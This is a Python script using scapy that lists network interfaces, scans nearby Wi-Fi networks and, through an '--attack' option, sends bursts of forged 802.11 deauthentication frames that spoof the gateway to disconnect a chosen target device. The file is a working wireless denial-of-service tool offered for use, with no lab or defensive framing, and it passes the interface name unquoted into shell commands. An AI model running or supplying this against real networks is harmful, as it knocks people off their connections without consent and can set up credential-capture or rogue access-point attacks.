from scapy.all import *
import argparse
import os
from subprocess import check_output

def list_interfaces():
    interfaces = get_if_list()
    print("Available network interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"{i+1}. {iface}")
    return interfaces

def scan_networks(interface):
    print(f"\nScanning for networks on interface {interface}...")
    try:
        os.system(f"sudo iwlist {interface} scan | grep 'ESSID\\|Address'")
    except Exception as e:
        print(f"Failed to scan networks on {interface}. Error: {e}")

def show_interface_details(interface):
    print(f"\nDetails for interface {interface}:")
    try:
        os.system(f"iwconfig {interface}")
    except Exception as e:
        print(f"Failed to get details for interface {interface}. Error: {e}")

def send_deauth_packets(target_mac, gateway_mac, interface, count):
    deauth_frame = RadioTap() / \
                   Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / \
                   Dot11Deauth(reason=7)
    print(f"\nStarting deauth attack on {target_mac} via {interface}...")
    sendp(deauth_frame, iface=interface, count=count, inter=0.1)
    print(f"Deauth packets sent: {count}")

def setup_and_attack():
    interfaces = list_interfaces()
    selected_interface_index = int(input("Select the interface number to use: ")) - 1
    if selected_interface_index not in range(len(interfaces)):
        print("Invalid selection!")
        return
    interface = interfaces[selected_interface_index]

    scan_networks(interface)
    target_mac = input("\nEnter the target MAC address: ")
    gateway_mac = input("Enter the gateway MAC address: ")
    count = int(input("Enter the number of deauth packets to send (default 100): ") or 100)

    send_deauth_packets(target_mac, gateway_mac, interface, count)

def main():
    parser = argparse.ArgumentParser(description="Network interface and deauthentication utility")
    parser.add_argument("--list", action="store_true", help="List all available network interfaces")
    parser.add_argument("--scan", action="store_true", help="Scan for available networks")
    parser.add_argument("--attack", action="store_true", help="Setup and perform deauthentication attack")
    args = parser.parse_args()

    if args.list:
        list_interfaces()
    elif args.scan:
        interfaces = list_interfaces()
        selected_interface_index = int(input("Select the interface number to use: ")) - 1
        if selected_interface_index in range(len(interfaces)):
            scan_networks(interfaces[selected_interface_index])
        else:
            print("Invalid selection!")
    elif args.attack:
        setup_and_attack()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
